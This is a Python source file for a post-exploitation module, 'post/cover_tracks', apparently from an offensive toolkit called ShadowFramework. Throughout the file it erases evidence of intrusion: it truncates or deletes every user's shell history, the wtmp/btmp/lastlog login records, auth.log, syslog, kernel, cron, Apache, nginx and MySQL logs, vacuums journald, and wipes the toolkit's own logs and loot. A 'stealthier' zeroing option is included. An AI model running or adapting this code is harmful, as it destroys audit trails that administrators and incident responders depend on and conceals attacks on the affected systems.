import os
import subprocess
import glob
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/cover_tracks',
        'description': 'Clear bash/zsh history, wtmp/btmp/lastlog, auth.log, syslog, and custom shadow framework logs.',
        'options': {
            'CLEAR_HISTORY': 'Clear shell history for all users [default: true]',
            'CLEAR_WTMP': 'Clear wtmp/btmp/lastlog (login records) [default: true]',
            'CLEAR_LOGS': 'Clear system logs (/var/log/auth.log, syslog etc.) [default: true]',
            'CLEAR_SHADOW_LOGS': 'Clear ShadowFramework log files [default: true]',
            'TARGET_USER': 'Target specific user (or ALL) [default: ALL]',
            'ZERO_LOGS': 'Zero out log files instead of deleting (stealthier) [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _run(self, cmd):
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        except Exception:
            pass

    def _zero_or_delete(self, path, zero):
        try:
            if os.path.exists(path):
                if zero:
                    with open(path, 'w') as f:
                        f.truncate(0)
                    console.print(f"  [green][+] Zeroed: {path}[/green]")
                else:
                    os.remove(path)
                    console.print(f"  [green][+] Deleted: {path}[/green]")
                log_action(f"Covered: {path}")
            else:
                console.print(f"  [dim]Not found: {path}[/dim]")
        except PermissionError:
            console.print(f"  [yellow][!] Permission denied: {path} (need root)[/yellow]")
        except Exception as e:
            console.print(f"  [red][!] Error on {path}: {e}[/red]")

    def _clear_history(self, target_user, zero):
        console.print("\n[cyan][*] Clearing shell history...[/cyan]")
        history_files = ['.bash_history', '.zsh_history', '.sh_history', '.history',
                         '.python_history', '.node_repl_history']

        # Get home directories
        if target_user == 'ALL':
            homes = [d for d in glob.glob('/home/*') if os.path.isdir(d)] + ['/root']
        else:
            homes = [f'/home/{target_user}']
            if target_user == 'root':
                homes = ['/root']

        for home in homes:
            if not os.path.isdir(home):
                continue
            for hf in history_files:
                self._zero_or_delete(os.path.join(home, hf), zero)

        # Also clear current session history in memory
        self._run('history -c 2>/dev/null')
        self._run('history -w /dev/null 2>/dev/null')
        console.print("  [green][+] Cleared in-memory history (current session).[/green]")

    def _clear_wtmp(self, zero):
        console.print("\n[cyan][*] Clearing login records...[/cyan]")
        login_logs = ['/var/log/wtmp', '/var/log/btmp', '/var/log/lastlog',
                      '/var/log/faillog', '/run/utmp']
        for log in login_logs:
            self._zero_or_delete(log, zero)

    def _clear_sys_logs(self, zero):
        console.print("\n[cyan][*] Clearing system logs...[/cyan]")
        sys_logs = [
            '/var/log/auth.log', '/var/log/auth.log.1',
            '/var/log/syslog', '/var/log/syslog.1',
            '/var/log/kern.log', '/var/log/kern.log.1',
            '/var/log/messages', '/var/log/secure',
            '/var/log/daemon.log', '/var/log/cron.log',
            '/var/log/apache2/access.log', '/var/log/apache2/error.log',
            '/var/log/nginx/access.log', '/var/log/nginx/error.log',
            '/var/log/mysql/error.log',
        ]
        for log in sys_logs:
            self._zero_or_delete(log, zero)

        # Also try to clear journald logs
        result = subprocess.run(['which', 'journalctl'], capture_output=True)
        if result.returncode == 0:
            try:
                subprocess.run(['journalctl', '--rotate', '--vacuum-time=1s'],
                               capture_output=True, timeout=10)
                console.print("  [green][+] journald logs rotated and vacuumed.[/green]")
                log_action("journald logs cleared")
            except Exception:
                pass

    def _clear_shadow_logs(self, zero):
        console.print("\n[cyan][*] Clearing ShadowFramework logs...[/cyan]")
        shadow_log_paths = ['logs/', 'loot/', '.shadow_history']
        for pattern in shadow_log_paths:
            if os.path.isdir(pattern):
                for f in glob.glob(os.path.join(pattern, '**', '*.log'), recursive=True):
                    self._zero_or_delete(f, zero)
                for f in glob.glob(os.path.join(pattern, '**', '*.txt'), recursive=True):
                    self._zero_or_delete(f, zero)
            elif os.path.isfile(pattern):
                self._zero_or_delete(pattern, zero)

    def run(self):
        clear_history = self.framework.options.get('CLEAR_HISTORY', 'true').lower() == 'true'
        clear_wtmp    = self.framework.options.get('CLEAR_WTMP', 'true').lower() == 'true'
        clear_logs    = self.framework.options.get('CLEAR_LOGS', 'true').lower() == 'true'
        clear_shadow  = self.framework.options.get('CLEAR_SHADOW_LOGS', 'true').lower() == 'true'
        target_user   = self.framework.options.get('TARGET_USER', 'ALL')
        zero_logs     = self.framework.options.get('ZERO_LOGS', 'true').lower() == 'true'

        method = "zeroing" if zero_logs else "deleting"
        console.print(f"[cyan][*] Covering tracks ({method} logs)...[/cyan]")
        log_action("Cover tracks started")

        if clear_history: self._clear_history(target_user, zero_logs)
        if clear_wtmp:    self._clear_wtmp(zero_logs)
        if clear_logs:    self._clear_sys_logs(zero_logs)
        if clear_shadow:  self._clear_shadow_logs(zero_logs)

        console.print(f"\n[bold green][+] Tracks covered. Ghost mode engaged.[/bold green]")
        # Ironically, this is the last thing we log
        log_action("Cover tracks complete — subsequent logs cleared")
